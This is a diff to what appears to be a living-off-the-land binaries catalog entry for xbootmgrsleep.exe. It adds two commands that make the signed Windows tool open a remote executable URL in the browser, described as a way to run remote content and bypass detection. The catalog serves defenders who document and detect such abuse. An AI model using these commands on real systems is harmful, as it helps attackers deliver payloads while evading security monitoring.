@@ -5,7 +5,7 @@ Author: Avihay Eldad
 Created: 2024-06-13
 Commands:
   - Command: xbootmgrsleep.exe 1000 "{EXE}"
-    Description: Execute executable with XBootMgrSleep, with a 1 second (=1000 milliseconds) delay.
+    Description: Execute executable via XBootMgrSleep, with a 1 second (=1000 milliseconds) delay.
     Usecase: Performs execution of specified executable, can be used as a defense evasion.
     Category: Execute
     Privileges: User
@@ -22,6 +22,24 @@ Commands:
     OperatingSystem: Windows
     Tags:
       - Execute: EXE
+  - Command: xbootmgrsleep.exe 1000 https://www.example.org/file.exe
+    Description: Opens the specified URL in the default browser with XBootMgrSleep, with a 1 second (=1000 milliseconds) delay.
+    Usecase: Can be used to execute remote content via the browser, potentially bypassing detection mechanisms.
+    Category: Execute
+    Privileges: User
+    MitreID: T1204.001
+    OperatingSystem: Windows
+    Tags:
+      - Execute: URL
+  - Command: xbootmgrsleep.exe -wakeupaction https://www.example.org/file.exe
+    Description: Opens the specified URL in the default browser using the -wakeupaction parameter with XBootMgrSleep.
+    Usecase: Can be used to initiate execution of remote content via default protocol handling.
+    Category: Execute
+    Privileges: User
+    MitreID: T1204.001
+    OperatingSystem: Windows
+    Tags:
+      - Execute: URL
 Full_Path:
   - Path: C:\Program Files\Windows Kits\10\Windows Performance Toolkit\xbootmgrsleep.exe
   - Path: C:\Program Files (x86)\Windows Kits\10\Windows Performance Toolkit\xbootmgrsleep.exe
